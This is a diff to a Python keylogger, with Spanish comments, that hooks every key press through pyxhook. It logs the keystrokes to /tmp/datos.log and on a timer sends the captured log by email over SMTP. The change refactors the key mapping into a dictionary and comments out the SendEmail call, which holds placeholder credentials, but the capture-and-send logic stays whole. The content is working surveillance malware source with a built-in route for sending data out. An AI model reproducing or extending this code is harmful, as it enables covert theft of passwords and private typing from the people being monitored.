@@ -2,73 +2,50 @@ import pyxhook
 import time, datetime
 import smtplib
 
-
 #Fichero donde se van a guardar  las pulsaciones
-log_file='/your/route/to/save/the/file/datos.log'
+log_file='/tmp/datos.log'
+
+dict_key = {
+	"Shift_R": "",
+	"Shift_L": "",
+	"space":" ",
+	"period":".",
+	"Return":"\n",
+	"[65027]":"[Alt Gr]",
+	"colon":":",
+	"semicolon":';',
+	"comma":',',
+	"slash":'/',
+	"underscore":'_',
+	"Tab":'[Tab]		',
+	"ntilde":'ny',
+	"plus":'*',
+	"BackSpace":'[Borrar]',
+	"ampersand":'&',
+	"parenleft":'(',
+	"parenright":')',
+	"equal":'=',
+	"quotedbl": '"',
+	"exclam":'!',
+	"question":'?',
+	"Down":'[Down]',
+	"Left":'[Left]',
+	"Right":'[Right]',
+	"Up":'[Up]'
+}
 
 #Esta funcion es llamada cuando se presiona una tecla
 def OnKeyPress(event):
 	fob=open(log_file,'a')
 
-	if (event.Key == "space"):
-		fob.write(" ")
-	elif (event.Key == "period"):
-		fob.write(".")
-	elif (event.Key == "Return"):	#Si das a Enter hace un salto de linea
-		fob.write("\n")
-	elif (event.Key == "Shift_R" or event.Key == "Shift_L" ):
-		fob.write("")
-	elif (event.Key == "[65027]"):
-		fob.write("[Alt Gr]")
-	elif(event.Ascii == 50):		#Codigo arroba, como Alt gr no lo pilla
-		fob.write("@")				#hay que capturar por numero ascii, no .Key
+	if (event.Ascii == 50):
+		fob.write("@")
 	elif(event.Ascii == 51):
 		fob.write("#")
 	elif (event.Ascii == 52):
 		fob.write("~")
-	elif (event.Key == "colon"):
-		fob.write(":")
-	elif (event.Key == "semicolon"):
-		fob.write(';')
-	elif (event.Key == "comma"):
-		fob.write(',')
-	elif (event.Key == "slash"):
-		fob.write('/')
-	elif (event.Key == "underscore"):
-		fob.write('_')
-	elif (event.Key == "Tab"):
-		fob.write('[Tab]		')
-	elif (event.Key == "ntilde"):
-		fob.write('ny')
-	elif (event.Key == "plus"):
-		fob.write('*')
-	elif (event.Key == "BackSpace"):
-		fob.write('[Borrar]')
-	elif (event.Key =="ampersand"):
-		fob.write('&')
-	elif (event.Key == "parenleft"):
-		fob.write('(')
-	elif (event.Key == "parenright"):
-		fob.write(')')
-	elif (event.Key == "equal"):
-		fob.write('=')
-	elif (event.Key == "quotedbl"):
-		fob.write('"')
-	elif (event.Key == "exclam"):
-		fob.write('!')
-	elif (event.Key == "question"):
-		fob.write('?')
-	elif (event.Key =="Down"):
-		fob.write('[Down]')
-	elif (event.Key =="Left"):
-		fob.write('[Left]')
-	elif (event.Key =="Right"):
-		fob.write('[Right]')
-	elif (event.Key =="Up"):
-		fob.write('[Up]')
-
 	else:
-		fob.write(event.Key)
+		fob.write(dict_key.get(event.Key, event.Key))
 
 	#print ("letra presionada: "+event.Key+' codigo ascii: ')
 	#print (event.Ascii)
@@ -112,7 +89,7 @@ def FormatAndSendLogEmail():
 		actualdate = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
 		data = f.read().replace('\n','')
 		data = 'Log capturado a las: '+actualdate+ '\n' + data
-		SendEmail('youremail@...', 'password', 'youremail@...', 'Nuevo log - '+actualdate, data)
+		# SendEmail('youremail@...', 'password', 'youremail@...', 'Nuevo log - '+actualdate, data)
 		f.seek(0)		#0 para apuntar al principio del fichero
 		f.truncate()	#Trunca el fichero ( borra todo lo que hay)
 
@@ -137,5 +114,3 @@ while True:
 	if TimeOut():
 		FormatAndSendLogEmail()
 		timeout = time.time() + wait_seconds #Tiempo limite en segundos, lo igualamos al tiempo actual mas los segundos a esperar
-
-
